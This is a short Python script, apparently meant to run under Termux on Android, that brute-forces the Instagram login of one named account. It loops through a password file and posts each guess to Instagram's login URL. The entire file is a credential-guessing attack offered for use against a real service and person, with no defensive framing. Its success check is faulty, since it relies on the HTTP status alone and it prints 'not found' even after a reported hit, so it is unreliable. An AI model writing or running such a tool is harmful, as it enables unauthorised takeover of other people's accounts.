import requests
import json

# Set the Instagram username and password file
username = "abom_jneid"
password_file = "./data/data/com.termux/files/home/password.txt"

# Set the Instagram login URL
login_url = "https://www.instagram.com/accounts/login/"

# Load the password list from the file
with open(password_file, "r") as f:
    passwords = [line.strip() for line in f.readlines()]

# Set the headers and data for the login request
headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; Android SDK built for x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {"username": username, "password": ""}

# Loop through the password list and try to login
for password in passwords:
    data["password"] = password
    response = requests.post(login_url, headers=headers, data=data)

    # Check if the login was successful
    if response.status_code == 200:
        print(f"Password found: {password}")
        break
    else:
        print(f"Password {password} is incorrect")

print("Password not found in the list")